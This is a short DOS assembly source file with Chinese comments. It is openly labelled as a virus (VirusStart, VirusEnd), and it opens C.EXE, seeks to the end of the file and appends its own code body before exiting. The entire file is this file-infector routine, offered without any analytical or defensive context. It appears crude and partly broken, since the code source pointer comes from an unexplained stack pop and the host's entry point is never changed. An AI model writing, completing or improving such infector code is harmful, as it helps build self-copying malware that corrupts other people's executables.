assume cs:code,ds:code
code segment
VirusStart:
pop si
start: jmp xc
;---------------------------------------------
f_namea db 'C.EXE',0 ;f_namea 存放文件名称
f_worda dw ?,0 ;f-worda 存放'文件内容!'
f_hao dw ?,0 ;f_hao 存放句柄
VirusLength equ VirusEnd-VirusStart 
;-----------------------------------------------
xc:
mov ah,3dh ;打开文件
mov dx,code
mov ds,dx
lea dx,f_namea 
mov al,2 
int 21h 
mov f_hao,ax ;这是AX文件句柄->给f_hao存放
xwz:
mov ah,42h ;移动文件指针
mov al,2 ;到文件尾部
mov bx,f_hao
xor cx,cx
xor dx,dx
int 21h
xw:
mov ah,40h ;写入内容
mov bx,f_hao ;把文件句柄给bx
mov dx,si 
mov cx,VirusLength 
int 21h
xend: 
mov ax,4c00h
int 21h
VirusEnd EQU $
code ends
end start